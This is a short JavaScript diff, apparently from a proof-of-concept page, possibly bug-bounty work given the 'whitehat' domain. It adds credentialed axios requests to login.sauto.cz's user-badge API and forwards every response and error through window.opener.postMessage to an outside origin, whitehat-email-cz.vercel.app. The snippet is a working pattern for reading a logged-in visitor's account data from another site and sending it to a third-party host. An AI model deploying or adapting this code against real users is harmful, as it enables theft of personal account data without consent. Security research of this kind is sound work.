@@ -16,9 +16,26 @@ axios
             credentials: "same-origin",
         },
     ).then((response) => {
-    window.opener.postMessage(response.data, 'https://whitehat-email-cz.vercel.app/')
-    window.close();
-})
+        window.opener.postMessage(response.data, 'https://whitehat-email-cz.vercel.app/')
+        window.close();
+    })
     .catch(error => {
-        console.log(error)
+        window.opener.postMessage(error, 'https://whitehat-email-cz.vercel.app/')
+        window.close();
+    });
+
+axios
+    .get(
+        'https://login.sauto.cz/api/v1/user/badge?service=sauto',
+        {
+            withCredentials: true,
+            credentials: "same-origin",
+        },
+    ).then((response) => {
+        window.opener.postMessage(response.data, 'https://whitehat-email-cz.vercel.app/')
+        window.close();
+    })
+    .catch(error => {
+        window.opener.postMessage(error, 'https://whitehat-email-cz.vercel.app/')
+        window.close();
     });
